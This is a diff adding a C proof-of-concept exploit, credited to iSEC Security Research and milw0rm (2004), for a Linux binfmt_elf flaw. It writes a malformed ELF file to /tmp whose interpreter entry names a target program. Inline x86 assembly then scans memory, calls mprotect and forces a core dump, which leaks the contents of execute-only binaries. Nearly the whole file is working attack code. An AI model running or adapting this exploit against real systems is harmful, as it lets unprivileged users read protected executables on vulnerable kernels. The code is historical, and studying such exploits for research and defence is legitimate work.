@@ -1,0 +1,162 @@
+/*
+ *
+ * binfmt_elf executable file read vulnerability
+ *
+ * gcc -O3 -fomit-frame-pointer elfdump.c -o elfdump
+ *
+ * Copyright (c) 2004 iSEC Security Research. All Rights Reserved.
+ *
+ * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
+ * AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
+ * WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
+ *
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+#include <sys/types.h>
+#include <sys/resource.h>
+#include <sys/wait.h>
+
+#include <linux/elf.h>
+
+#define BADNAME "/tmp/_elf_dump"
+
+void usage(char *s)
+{
+        printf("\nUsage: %s executable\n\n", s);
+        exit(0);
+}
+
+// ugly mem scan code :-)
+static volatile void bad_code(void)
+{
+__asm__(
+// "1: jmp 1b \n"
+                " xorl %edi, %edi \n"
+                " movl %esp, %esi \n"
+                " xorl %edx, %edx \n"
+                " xorl %ebp, %ebp \n"
+                " call get_addr \n"
+
+                " movl %esi, %esp \n"
+                " movl %edi, %ebp \n"
+                " jmp inst_sig \n"
+
+                "get_addr: popl %ecx \n"
+
+// sighand
+                "inst_sig: xorl %eax, %eax \n"
+                " movl $11, %ebx \n"
+                " movb $48, %al \n"
+                " int $0x80 \n"
+
+                "ld_page: movl %ebp, %eax \n"
+                " subl %edx, %eax \n"
+                " cmpl $0x1000, %eax \n"
+                " jle ld_page2 \n"
+
+// mprotect
+                " pusha \n"
+                " movl %edx, %ebx \n"
+                " addl $0x1000, %ebx \n"
+                " movl %eax, %ecx \n"
+                " xorl %eax, %eax \n"
+                " movb $125, %al \n"
+                " movl $7, %edx \n"
+                " int $0x80 \n"
+                " popa \n"
+
+                "ld_page2: addl $0x1000, %edi \n"
+                " cmpl $0xc0000000, %edi \n"
+                " je dump \n"
+                " movl %ebp, %edx \n"
+                " movl (%edi), %eax \n"
+                " jmp ld_page \n"
+
+                "dump: xorl %eax, %eax \n"
+                " xorl %ecx, %ecx \n"
+                " movl $11, %ebx \n"
+                " movb $48, %al \n"
+                " int $0x80 \n"
+                " movl $0xdeadbeef, %eax \n"
+                " jmp *(%eax) \n"
+
+        );
+}
+
+static volatile void bad_code_end(void)
+{
+}
+
+int main(int ac, char **av)
+{
+struct elfhdr eh;
+struct elf_phdr eph;
+struct rlimit rl;
+int fd, nl, pid;
+
+        if(ac<2)
+                usage(av[0]);
+
+// make bad a.out
+        fd=open(BADNAME, O_RDWR|O_CREAT|O_TRUNC, 0755);
+        nl = strlen(av[1])+1;
+        memset(&eh, 0, sizeof(eh) );
+
+// elf exec header
+        memcpy(eh.e_ident, ELFMAG, SELFMAG);
+        eh.e_type = ET_EXEC;
+        eh.e_machine = EM_386;
+        eh.e_phentsize = sizeof(struct elf_phdr);
+        eh.e_phnum = 2;
+        eh.e_phoff = sizeof(eh);
+        write(fd, &eh, sizeof(eh) );
+
+// section header(s)
+        memset(&eph, 0, sizeof(eph) );
+        eph.p_type = PT_INTERP;
+        eph.p_offset = sizeof(eh) + 2*sizeof(eph);
+        eph.p_filesz = nl;
+        write(fd, &eph, sizeof(eph) );
+
+        memset(&eph, 0, sizeof(eph) );
+        eph.p_type = PT_LOAD;
+        eph.p_offset = 4096;
+        eph.p_filesz = 4096;
+        eph.p_vaddr = 0x0000;
+        eph.p_flags = PF_R|PF_X;
+        write(fd, &eph, sizeof(eph) );
+
+// .interp
+        write(fd, av[1], nl );
+
+// execable code
+        nl = &bad_code_end - &bad_code;
+        lseek(fd, 4096, SEEK_SET);
+        write(fd, &bad_code, 4096);
+        close(fd);
+
+// dump the shit
+        rl.rlim_cur = RLIM_INFINITY;
+        rl.rlim_max = RLIM_INFINITY;
+        if( setrlimit(RLIMIT_CORE, &rl) )
+                perror("\nsetrlimit failed");
+        fflush(stdout);
+        pid = fork();
+        if(pid)
+                wait(NULL);
+        else
+                execl(BADNAME, BADNAME, NULL);
+
+        printf("\ncore dumped!\n\n");
+        unlink(BADNAME);
+
+return 0;
+} 
+
+// milw0rm.com [2004-11-10]
